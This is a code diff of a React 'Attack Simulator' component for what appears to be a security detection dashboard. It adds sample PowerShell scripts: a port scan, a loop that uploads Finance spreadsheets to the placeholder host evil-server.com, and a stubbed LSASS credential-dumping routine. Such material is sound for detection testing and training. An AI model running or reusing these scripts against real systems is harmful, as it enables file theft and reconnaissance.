@@ -2,42 +2,85 @@
 import { useState } from 'react';
 import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Textarea } from "@/components/ui/textarea";
 import { useAttackSimulation } from '@/context/attack-simulation-context';
-import { Loader2 } from 'lucide-react';
+import { Loader2, FileText } from 'lucide-react';
+import { useToast } from '@/hooks/use-toast';
 
-const attacks = [
+const sampleScripts = [
     {
-        value: "dns-flood",
-        name: "DNS Flood (DDoS)",
-        description: "A type of Distributed Denial of Service (DDoS) attack where the attacker floods a particular domain's DNS servers in an attempt to disrupt DNS resolution for that domain."
+        name: "Simple Port Scan",
+        script: `
+# Simple Port Scan
+$target = "10.0.1.25"
+$ports = 1..1024
+
+foreach ($port in $ports) {
+    Test-NetConnection -ComputerName $target -Port $port -InformationLevel "Quiet"
+    if ($?) {
+        Write-Host "Port $port is open on $target"
+    }
+}
+Write-Host "Port scan complete."
+`
     },
     {
-        value: "http-flood",
-        name: "HTTP Flood (DDoS)",
-        description: "A type of DDoS attack where the attacker exploits legitimate-seeming HTTP GET or POST requests to attack a web server or application. It requires less bandwidth than other attacks to bring down the targeted site or server."
+        name: "Data Exfiltration",
+        script: `
+# Find and upload sensitive files
+$sourceDir = "C:\\Users\\Finance\\Documents\\"
+$files = Get-ChildItem -Path $sourceDir -Include *.xlsx, *.csv -Recurse
+$destination = "http://evil-server.com/upload"
+
+foreach ($file in $files) {
+    try {
+        Invoke-RestMethod -Uri $destination -Method Post -InFile $file.FullName
+        Write-Host "Uploaded $($file.Name)"
+    } catch {
+        Write-Host "Failed to upload $($file.Name)"
+    }
+}
+`
     },
     {
-        value: "credential-stuffing",
-        name: "Credential Stuffing",
-        description: "A cyberattack in which stolen account credentials, typically consisting of lists of usernames and/or email addresses and the corresponding passwords, are used to gain unauthorized access to user accounts through large-scale automated login requests."
-    },
-    {
-        value: "sql-injection",
-        name: "SQL Injection",
-        description: "An attack that attempts to use malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This may include sensitive company data, user lists or private customer details."
+        name: "Credential Dumping",
+        script: `
+# Mimikatz-like behavior to dump credentials from memory
+# This is a conceptual script
+function Get-LsassProcess {
+    return Get-Process -Name lsass
+}
+
+$lsass = Get-LsassProcess
+if ($lsass) {
+    $handle = $lsass.Handle
+    # In a real attack, would use handle to read memory
+    Write-Host "Access gained to LSASS process (PID: $($lsass.Id))."
+    Write-Host "Simulating credential extraction..."
+    Start-Sleep -Seconds 2
+    Write-Host "SAM, SECURITY, and SYSTEM hives targeted."
+} else {
+    Write-Host "LSASS process not found."
+}
+`
     }
 ];
 
-
-export function AttackSimulator() {
+export function PowerShellSimulator() {
     const { runAttack, loading } = useAttackSimulation();
-    const [selectedAttack, setSelectedAttack] = useState(attacks[0]);
+    const [scriptContent, setScriptContent] = useState(sampleScripts[0].script.trim());
+    const { toast } = useToast();
 
     const handleRunSimulation = () => {
-        if (selectedAttack) {
-            runAttack(selectedAttack.name, selectedAttack.description);
+        if (!scriptContent.trim()) {
+            toast({
+                variant: 'destructive',
+                title: 'Error',
+                description: 'Script content cannot be empty.',
+            });
+            return;
         }
+        runAttack(scriptContent);
     };
     
     return (
@@ -45,41 +88,48 @@ export function AttackSimulator() {
             <header>
                 <h1 className="text-3xl font-bold tracking-tight">Attack Simulator</h1>
                 <p className="text-muted-foreground">
-                    Select and run a simulated cyber attack to test the detection system.
+                    Simulate an attack by providing a script for the AI to analyze and execute in a virtual environment.
                 </p>
             </header>
             <Card>
                 <CardHeader>
-                    <CardTitle>Select an Attack Scenario</CardTitle>
-                    <CardDescription>Choose a scenario. The AI will generate realistic security events and metrics based on your selection.</CardDescription>
+                    <CardTitle>Script-based Simulation</CardTitle>
+                    <CardDescription>
+                        Paste a script below or select a sample. The AI will analyze its intent and generate a full simulation across the dashboard.
+                    </CardDescription>
                 </CardHeader>
                 <CardContent>
-                    <Tabs defaultValue={attacks[0].value} className="w-full" onValueChange={(v) => setSelectedAttack(attacks.find(a => a.value === v)!)}>
-                        <TabsList className="grid w-full grid-cols-4">
-                            {attacks.map(attack => (
-                                <TabsTrigger key={attack.value} value={attack.value}>{attack.name}</TabsTrigger>
+                    <div className="mb-4">
+                        <h4 className="text-sm font-medium mb-2">Sample Scripts</h4>
+                        <div className="flex flex-wrap gap-2">
+                            {sampleScripts.map(sample => (
+                                <Button
+                                    key={sample.name}
+                                    variant="outline"
+                                    size="sm"
+                                    onClick={() => setScriptContent(sample.script.trim())}
+                                >
+                                    <FileText className="mr-2 h-4 w-4" />
+                                    {sample.name}
+                                </Button>
                             ))}
-                        </TabsList>
-                        {attacks.map(attack => (
-                            <TabsContent key={attack.value} value={attack.value}>
-                               <Card className="mt-4">
-                                   <CardHeader>
-                                       <CardTitle>{attack.name}</CardTitle>
-                                   </CardHeader>
-                                   <CardContent>
-                                       <p className="text-sm text-muted-foreground">{attack.description}</p>
-                                   </CardContent>
-                               </Card>
-                            </TabsContent>
-                        ))}
-                    </Tabs>
+                        </div>
+                    </div>
+                    
+                    <Textarea 
+                        placeholder="Paste your PowerShell or shell script here..."
+                        className="h-64 font-mono text-xs"
+                        value={scriptContent}
+                        onChange={(e) => setScriptContent(e.target.value)}
+                    />
                      <div className="flex w-full items-center justify-end mt-6">
                         <Button 
                             onClick={handleRunSimulation} 
                             disabled={loading}
+                            size="lg"
                         >
                             {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-                            {loading ? 'Simulating...' : `Run ${selectedAttack.name} Simulation`}
+                            {loading ? 'Simulating...' : 'Run Simulation'}
                         </Button>
                     </div>
                 </CardContent>
